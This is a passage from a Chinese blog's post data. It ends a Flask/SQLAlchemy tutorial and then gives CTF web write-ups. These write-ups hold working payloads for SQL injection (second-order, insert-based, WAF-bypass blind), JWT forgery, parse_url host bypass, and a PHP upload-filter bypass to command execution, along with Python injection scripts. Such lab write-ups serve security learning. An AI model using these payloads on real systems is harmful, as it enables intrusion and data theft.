\"&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8\".format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)SQLALCHEMY_TRACK_MODIFICATIONS = False (3)在主app文件中，添加配置文件： 12345678910111213141516from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyimport configapp = Flask(__name__)app.config.from_object(config)db = SQLAlchemy(app)db.create_all()@app.route('/')def index(): return ''if __name__ == '__main__': app.run(debug=True) (4)测试有没有问题报错，如无，则成功连接 使用Flask-SQLAlchemy创建模型与表的映射1.模型需要继承自db.Model，然后需要映射到表中的属性，必须写成’db.Column’的数据类型 2.数据类型：db.Integer代表的是整型，db.String代表的是varchar，需要指定最长的长度，db.Text代表的是text 3.其他参数：primary_key代表的是将这个字段设置为主键，autoincrement代表的是这个主键为自增长的，nullable代表的是这个字段是否可以为空，可以将这个值设置为False，在数据库中，这个值就不能为空了 4.最后需要调用db.create_all来将模型真正创建到数据库中 例子： config.py 12345678910DIALECT = 'mysql'DRIVER = 'mysqldb'USERNAME = 'root'PASSWORD = 'root'HOST = '127.0.0.1'PORT = '3306'DATABASE = 'db_demo2'SQLALCHEMY_DATABASE_URI = \"&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8\".format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)SQLALCHEMY_TRACK_MODIFICATIONS = False 创建table执行的sql语句： 12345create table article( id int primary key auto_increment, title varchar(100) not null, content text not null,) db_demo2.py 1234567891011121314151617181920212223from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyimport configapp = Flask(__name__)app.config.from_object(config)db = SQLAlchemy(app)class Article(db.Model): __tablename__ = 'article' id = db.Column(db.Integer,primary_key=True,autoincrement=True) title = db.Column(db.String(100),nullable=False) content = db.Column(db.Text,nullable=False)db.create_all()@app.route('/')def index(): return 'index'if __name__ == '__main__': app.run(debug=True) Flask-SQLAlchemy数据的增，删，改，查1.增： 123article1 = Article(title='aaa',content='bbb')db.session.add(article1)db.session.commit() 2.查： 123article1 = Article.query.filter(Article.title == 'aaa').first()print 'title:%s' % article1.titleprint 'content:%s' % article1.content 3.改： 123456# 先把你要更改的数据查找出来article1 = Article.query.filter(Article.title == 'aaa').first()# 把这条数据进行修改article1.title = 'new title'# 做事务的提交db.session.commit() 4.删： 123456# 把需要删除的数据查找出来article1 = Article.query.filter(Article.content == 'bbb').first()# 把这条数据删除掉db.session.delete(article1)# 做事务的提交db.session.commit() flask中的session工作机制1.flask中的session机制是：把敏感数据经过加密后放入session中，然后再把session存放到cookie中，下次请求的时候，再把浏览器发送过来的cookie中读取session，然后再从session中读取敏感数据，并进行解密，获取最终的用户数据 2.flask的这种session机制，可以节省服务器的开销，因为把所有的信息都存储到了客户端（浏览器） 3.安全是相对的，把session放到cookie中，经过加密，也是比较安全的 flask操作session1.session的操作方式： (1)使用session需要从flask中导入session，以后和session相关的操作都是通过这个变量来的 (2)使用session需要设置SECRET_KEY，作为加密用的，并且这个SECRET_KEY，如果每次服务器启动后都变化的话，那么之前的session就不能再通过当前这个SECRET_KEY就不能再进行解密了 (3)操作session的时候，跟操作字典是一样的 (4)添加session：session[‘username’]=’admin’ (5)删除：session.pop(‘username’) (6)清除所有session：session.clear() (7)获取session：session.get(‘username’) 例子： 123456789101112131415161718192021from flask import Flask,sessionimport osapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(24) #设置随机24位字符串作为加密的盐@app.route('/')def index(): session['username'] = 'admin' return 'hello'@app.route('/get/')def get(): return session.get('username')@app.route('/delete/')def delete(): print session.get('username') session.pop('username') print session.get('username') return 'success' 2.设置session过期时间 (1)如果没有指定session的过期时间，那么默认浏览器关闭后就自动结束 (2)如果设置了session的permanent属性为True，那么过期时间是31天 (3)可以通过给app.config设置PERMANENT_SESSION_LIFETIME来更改过期时间，这个值的数据类型是datetime.timedelay类型 Flask实现GET和POST请求获取参数1.get请求是通过flask.request.args来获取 2.post请求是通过flask.request.form来获取 3.post请求在模板中要注意几点： (1)input标签中，要写name来标识这个value的key，方便后台获取 (2)在写form表单的时候，要指定method=’post’，并且要指定action=’/login/‘ 实例： 实现页面跳转 123456789101112131415from flask import Flask,render_templateapp = Flask(__name__)@app.route('/')def index(): return render_template('get_post_demo.html')@app.route('/search/')def search(): return 'search'@app.route('/login/')def login(): return 'login' html代码： 1&lt;a href=\"&#123;&#123; url_for('search',q='hello') &#125;&#125;\"&gt;跳转到搜索页面&lt;/a&gt; 获取GET请求参数 12345678910111213141516from flask import Flask,render_template,requestapp = Flask(__name__)@app.route('/')def index(): return render_template('get_post_demo.html')@app.route('/search/')def search(): q = request.args.get('q') return 'get:%s'%q@app.route('/login/')def login(): return 'login' 获取POST请求参数 123456789101112131415161718192021from flask import Flask,render_template,requestapp = Flask(__name__)@app.route('/')def index(): return render_template('get_post_demo.html')@app.route('/search/')def search(): q = request.args.get('q') return 'get:%s'%q@app.route('/login/',methods=['GET','POST'])def login(): if request.method == 'GET': return render_template('login.html') elif request.method == 'POST': username = request.form.get('username') password = request.form.get('password') return 'username:%s password:%s'%(username,password) html代码： 123456789101112131415161718&lt;form action=\"&#123;&#123; url_for('login') &#125;&#125;\" method=\"post\"&gt; &lt;table&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;用户名：&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" placeholder=\"请输入用户名\" name=\"username\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密码：&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" placeholder=\"请输入密码\" name=\"password\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=\"submit\" value=\"登录\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;/form&gt; 保存全局变量的g属性g:global 1.g对象是专门用来保存用户的数据 2.g对象在一次请求中的所有的代码的地方，都是可以使用的 钩子函数(hook)1.before_request:在请求之前执行的，即在视图函数执行之前执行的，这个函数只是一个装饰器，他可以把需要设置为钩子函数的代码放到视图函数执行之前来执行 示例代码： 123456789101112131415161718192021222324252627282930313233343536373839#encoding: utf-8from flask import Flask,render_template,request,session,g,redirect,url_forimport osapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(24)@app.route('/')def index(): return render_template('get_post_demo.html')@app.route('/login/',methods=['GET','POST'])def login(): if request.method == 'GET': return render_template('login.html') elif request.method == 'POST': username = request.form.get('username') password = request.form.get('password') if username == 'admin' and password == '123456': session['username'] = username return u'登录成功' else: return u'用户名或密码错误'@app.route('/edit/')def edit(): if hasattr(g,'username'): return u'修改成功' else: return redirect(url_for('login'))@app.before_requestdef before_request(): if session.get('username'): g.username = session.get('username')if __name__ == '__main__': app.run(debug=True) 2.context_processor: (1)上下文处理器应该返回一个字典，字典中的key会被模板中当成变量来渲染 (2)上下文处理器中返回的字典，在所有页面中都是可用的 示例代码： 12345@app.context_processordef my_context_processor(): username = session.get('username') if username: return &#123;'username':username&#125; 视频学习地址：flask视频学习","categories":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"网鼎杯第三场Web","slug":"网鼎杯第三场Web","date":"2018-09-04T10:45:00.000Z","updated":"2018-09-04T13:24:41.598Z","comments":true,"path":"/posts/25445/","link":"","permalink":"https://Foxgrin.github.io/posts/25445/","excerpt":"2018年网鼎杯第三场Web题解","text":"2018年网鼎杯第三场Web题解 comein题目：由于运维人员失误，内网认证页面部署至了外网，不过还好，开发加了域名验证。 做的时候服务器已经关闭了，获取源代码本地测试(PS:文件名为index.php，文件放在根目录下，浏览器输入localhost访问) 源代码如下： 12345678910111213141516&lt;?phpini_set(\"display_errors\",0);$uri = $_SERVER['REQUEST_URI'];if(stripos($uri,\".\"))&#123; die(\"Unknow URI.\");&#125;if(!parse_url($uri,PHP_URL_HOST))&#123; $uri = \"http://\".$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];&#125;$host = parse_url($uri,PHP_URL_HOST);if($host === \"c7f.zhuque.com\")&#123; setcookie(\"AuthFlag\",\"flag&#123;***&#125;\");&#125;?&gt; 源代码看出，要绕过stripos函数的检测，首先我们要弄清楚全局变量$_SERVER[‘REQUEST_URI’] 12345&lt;?phpecho $_SERVER['REQUEST_URI'];?&gt; 可见返回的是url中/后面的内容 parse_url函数作用是截取url中的指定部分，PHP_URL_HOST是截取url中的主机信息部分 示例： 12345678910111213141516171819202122&lt;?php$url = 'http://username:password@hostname:9090/path?arg=value#anchor';var_dump(parse_url($url, PHP_URL_SCHEME));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_USER));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_PASS));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_HOST));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_PORT));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_PATH));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_QUERY));echo '&lt;br&gt;';var_dump(parse_url($url, PHP_URL_FRAGMENT));echo '&lt;br&gt;';var_dump($_SERVER['REMOTE_ADDR']);?&gt; 执行结果： 可以看出parse_url($url, PHP_URL_HOST)截取的是@后面的hostname 最后要获取flag条件是截取的hostname等于c7f.zhuque.com，所以构造payload:.@c7f.zhuque.com/..// 最前面的.是为了绕过stripos函数，位置为0就不会执行die函数 本地测试代码： 123456789101112131415161718192021&lt;?phpini_set(\"display_errors\",0);$uri = $_SERVER['REQUEST_URI'];echo '$uri = '.$uri.\"&lt;br&gt;\";if(stripos($uri,\".\"))&#123; die(\"Unknow URI.\");&#125;echo 'stripos($uri,\".\") = '.stripos($uri,\".\").\"&lt;br&gt;\";echo \"parse_url($uri,PHP_URL_HOST) = \".parse_url($uri,PHP_URL_HOST).\"&lt;br&gt;\";if(!parse_url($uri,PHP_URL_HOST))&#123; $uri = \"http://\".$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];&#125;echo '$uri = '.$uri.\"&lt;br&gt;\";$host = parse_url($uri,PHP_URL_HOST);echo '$host = '.$host.\"&lt;br&gt;\";if($host === \"c7f.zhuque.com\")&#123; setcookie(\"AuthFlag\",\"flag&#123;***&#125;\");&#125;?&gt; 最后加上../是为了回到根目录，再加个/就等于回到localhost/ gold题目：还在上小学的小明同学开发了一款游戏，你能通关吗？ 抓包发现不断POST参数getGod，值从0开始叠加，图片显示收集1000金币就可以通关，就猜测可能POST参数getGod从0到1001就可以得到flag 利用burp的intruder模块发送参数getGod，值从0到1001 发现getGod=1001的响应包中显示了flag PS：这关有防作弊机制，必须单线程的POST参数getGod从0到1001，否则就弹出防作弊的提示框 i_am_admin题目：你能登录进去吗？ 一个登录界面，貌似要以admin身份才能获得flag 给出了提示We have prepare a test account for you to login; Username:Passwd = test:test 以test身份登录 抓取登录数据包，发现登录时在cookie字段设置了auth字段 获得信息： 1Welcome back test user, although i can&apos;t give u flag, but i will give u my SECRET:uy8qz-!kru%*2h7$q&amp;veq=y_r1abu-xd_219y%phex!@4hv62+ 查询得知是JWT，JWT具体介绍参考下面链接 https://blog.csdn.net/qq_40081976/article/details/79046825 到https://jwt.io/解码 登录test身份设置了auth字段，值就是JWT加密后的值，那么我们可以抓包在cookie添加auth字段，值为admin的JWT值，即eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.NYSsNZ1gR8EUYebNTmXPBhdoh-mA5OjHkeWjM4gPxqY 获得flag phone题目：find the flag 有登录和注册的页面，试着注册账号test1,密码123,电话123 返回index.php页面 点击查询得到：有1人和你电话相似哦~ 猜测存在二次注入，根据我们注册用户的电话号码执行sql语句 1select count(*) from table where telephone='123'; 我们再注册账号，密码123，电话123’# 这里电话号码必须是数字，我们可以将字符串转化为十六进制 在本地数据库测试一下 先创建表tel 123456create table tel(username varchar(20),password varchar(20),telphone varchar(100)); 插入数据 12insert into tel values('test1','123','123');insert into tel values('test2','123',\"123#'\"); 那么我们的注入点就在注册POST的phone参数，也就是电话号码 首先爆库，payload:123’ union select database() order by 1 desc# 库名为test 这里末尾加上order by 1 desc是为了将结果倒序 直接在数据库测试简单明了 如果不加order by，那么就只会显示查询的第一行结果1，如果我们将结果倒序处理 那么就显示了我们注入的结果 继续爆表，payload:123’ union select group_concat(table_name) from information_schema.tables where table_schema=database() order by 1 desc# 表名为flag,user 爆flag表下的列名，payload:123’ union select group_concat(column_name) from information_schema.columns where table_name=’flag’ order by 1 desc# 列名为f14g 爆f14g列下数据，payload:123’ union select group_concat(f14g) from flag order by 1 desc# 获得flag","categories":[{"name":"ctf-Web","slug":"ctf-Web","permalink":"https://Foxgrin.github.io/categories/ctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"网鼎杯第二场Web","slug":"网鼎杯第二场Web","date":"2018-08-22T15:02:00.000Z","updated":"2018-09-04T13:24:19.920Z","comments":true,"path":"/posts/47793/","link":"","permalink":"https://Foxgrin.github.io/posts/47793/","excerpt":"2018年网鼎杯第二场Web题解","text":"2018年网鼎杯第二场Web题解 wafUpload源代码 12345678910111213141516171819202122232425262728293031&lt;?php$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);@mkdir($sandbox);@chdir($sandbox);if (!empty($_FILES[&apos;file&apos;])) &#123; #mime check if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) &#123; die(&apos;This type is not allowed!&apos;); &#125; #check filename $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;]; if (!is_array($file)) &#123; $file = explode(&apos;.&apos;, strtolower($file)); &#125; $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) &#123; die(&apos;This file is not allowed!&apos;); &#125; $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) &#123; echo &apos;Success!&apos;; echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename; &#125; else &#123; echo &apos;Failed!&apos;; &#125;&#125;show_source(__file__);?&gt; 一道有过滤的文件上传题，首先过滤的是文件的类型，修改上传类型为[‘image/jpeg’, ‘image/png’, ‘image/gif’]数组中任一一个元素即可，接下来将数组$file的最后一个元素取出判断是否是[‘jpg’, ‘png’, ‘gif’]中的任一元素，如果不是则退出程序，最终上传的文件名为”数组$file的第一个元素.$file[count($file) - 1]”，我们知道如果是一个完整的数组，那么$file[count($file) - 1]一定是数组的最后一个元素，而上面又将最后一个元素规定为jpg或png或gif，而我们的目的是上传一个php文件，那么后缀名一定是要.php，那么我们就可以上传一个不完整的数组，例如 123456789&lt;?php $file = array(); $file[0] = 'demo.php'; $file[10] = 'jpg'; echo $file[count($file) - 1]; //NULL echo '&lt;br&gt;'; $filename = reset($file) . '.' . $file[count($file) - 1]; echo $filename; //demo.php.?&gt; 这样就可以成功上传一个php文件，但是我们最终得到的文件名最后还有一个’.’，所以我们将$file[0]=demo.php/ 这样最终得到demo.php/. burp抓包修改 文件成功上传 访问url/upload/85ed06a27b8eb105c27cbc380822ede8/demo.php/. 抓包POST参数cmd任意执行命令 发现flag 读取 unfinished首先来到的页面时login.php，没有其他提示，扫一下后台，发现register.php， 是一个注册页面，我们试着注册一个用户后登录，这里通过抓包发现注册成功后会返回302状态码重定向到login.php，否则返回200状态码回到register.php 我们可以发现，登录后又重定向到index.php，其中只有显示了用户名 有注册页面，有登录页面，很明显的存在sql查询，那么可以猜测注册页面的sql语句是 1insert into tables values('$email','$username','$password') 如果执行成功，则注册成功，重定向到login.php，然后执行sql语句 1insert into tables values('$email','$username','$password') 有查询结果则登录成功，返回查询结果的用户名信息 那么我们就可以推测这里存在二次注入，我们在register.php中的insert语句注入username，在index.php中显示注入的结果，这就是二次注入 接下来考虑insert注入 直接给出我的payload： 10&apos;+ascii(substr((select database()) from 1 for 1))+&apos;0 这样sql语句就变成了 1insert into tables values('$email','0'+ascii(substr((select database()) from 1 for 1))+'0','$password') 本地数据库测试可行 那么接下来就是写脚本注入了 附上我的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestsimport reregister_url = \"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/register.php\"login_url = \"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/login.php\"database = \"\"table_name = \"\"column_name = \"\"flag = \"\"#获取数据库名for i in range(1,10): register_data = &#123; 'email':'test@test'+ str(i), 'username':\"0'+ascii(substr((select database()) from %d for 1))+'0\"%i, 'password':123 &#125; r = requests.post(url=register_url,data=register_data) login_data = &#123; 'email':'test@test'+ str(i), 'password':123 &#125; r = requests.post(url=login_url,data=login_data) match = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r.text) asc = match.group(1) if asc == '0': break database = database + chr(int(asc))print('database:',database)#获取表名'''for i in range(1,20): register_data = &#123; 'email':'test@test'+ str(i), 'username':\"0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))+'0\"%i, 'password':123 &#125; r = requests.post(url=register_url,data=register_data) print(r.text) login_data = &#123; 'email':'test@test'+ str(i), 'password':123 &#125; r = requests.post(url=login_url,data=login_data) r.encoding = r.apparent_encoding print(r.text) match = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r.text) asc = match.group(1) if asc == '0': break table_name = table_name + chr(int(asc))print('table_name:',table_name)'''#获取flagfor i in range(1,100): register_data = &#123; 'email':'test@test'+ str(i) + str(i), 'username':\"0'+ascii(substr((select * from flag) from %d for 1))+'0\"%i, 'password':123 &#125; r = requests.post(url=register_url,data=register_data) login_data = &#123; 'email':'test@test'+ str(i) + str(i), 'password':123 &#125; r = requests.post(url=login_url,data=login_data) match = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r.text) asc = match.group(1) if asc == '0': break flag = flag + chr(int(asc))print('flag:',flag) 这里实际测试获取表名，发现information被过滤了，flag表只能猜测得到 最后执行结果 sqlweb题目首先给出了提示”admin拿不到flag”，题目是一个登陆页面，猜测存在sql注入 首先我们应该是要用admin来登录，先寻找注入点 抓包测试，服务器先检测输入的用户名是否存在，再检查密码是否正确 我们输入uname=admin&amp;passwd=1&amp;submit=login,提示password error 输入uname=admin’#&amp;passwd=1&amp;submit=login,提示password error 说明注入点可能在uname，被单引号包裹，那么我们可以根据提示password error 或者username error进行基于布尔的注入 输入uname=admin’ and 1=1#&amp;passwd=1&amp;submit=login,提示password error 提示waf:/sleep|benchmark|=|like|regexp|and||%|substr|union|\\s+|group|floor|user|extractvalue|UpdateXml|ord|lpad|rpad|left|&gt;|,|ascii/i !!! (trust me,no one can bypass it) 说明此处存在过滤关键字的waf，过滤了空格，用/**/替代，过滤了逗号，过滤了and，用&amp;&amp;替代，还过滤了等号，&gt;，不等号也没办法用，这里可以用in语句来进行布尔注入的判断 过滤了substr,还有mid可以用，过滤了逗号，那么可以用mid( from 1 for 1) 那么我们可以构造payload 1uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/database())/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login 根据返回的username error或者password error判断，如果返回password error，说明判断语句正确，返回username error说明判断语句错误 这里发现响应头部字段存在提示 1hint: &lt;!--create table users ...id username passwd --&gt; 告诉了我们表的结构 猜测flag在passwd，那么我们就注出passwd列下的数据，payload如下 1uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/passwd/**/from/**/users)/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login 但是发现这里还过滤了user，那么就去掉users 1uname=admin&apos;/**/&amp;&amp;/**/mid(passwd/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login 为什么可以这样呢，经过测试发现如果sql语句的前面已经指定了表和用户名，那么passwd直接返回的是该表下用户名对应的密码，如下图所示 接下来就是写个脚本注入了 1234567891011121314151617181920212223import requestsurl = \"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php\"all_string = \"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm\"passwd = \"\"f = 0for i in range(1,100): for j in all_string: data = &#123; 'uname':\"admin'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#\"%(i,j), 'passwd':'1', 'submit':'login' &#125; r = requests.post(url,data=data) if len(r.text) == 75: passwd = passwd + j break elif len(r.text) == 77 and j == 'm': f = 1 break if f == 1: breakprint('passwd:',passwd) 运行结果passwd: admin123 登录admin用户，提示只有wuyanzu用户才能拿到flag 那么我们再爆wuyanzu的密码 1234567891011121314151617181920212223import requestsurl = \"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php\"all_string = \"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm\"passwd = \"\"f = 0for i in range(1,100): for j in all_string: data = &#123; 'uname':\"wuyanzu'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#\"%(i,j), 'passwd':'1', 'submit':'login' &#125; r = requests.post(url,data=data) if len(r.text) == 75: passwd = passwd + j break elif len(r.text) == 77 and j == 'm': f = 1 break if f == 1: breakprint('passwd:',passwd) 执行结果passwd: flag{de822b90-2edf-404c-aaeb-8e797768d9ea} 拿到flag","categories":[{"name":"ctf-Web","slug":"ctf-Web","permalink":"https://Foxgrin.github.io/categories/ctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"hackinglab-Web","slug":"hackinglab-Web","date":"2018-08-20T03:16:00.000Z","updated":"2018-09-04T13:22:50.071Z","comments":true,"path":"/posts/44938/","link":"","permalink":"https://Foxgrin.github.io/posts/44938/","excerpt":"hackinglab平台Web题解","text":"hackinglab平台Web题解 基础关第一题网址：http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php 源代码找到flag 第二题给了密文xrlvf23xfqwsxsqf ，需要我们再加密一次，经过查询这是rot13编码，再加密一次得到keyis23ksdjfkfds 第三题给出了base64加密的密文，需要我们不断解密，写个脚本 123456789101112import base64password = \"Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVN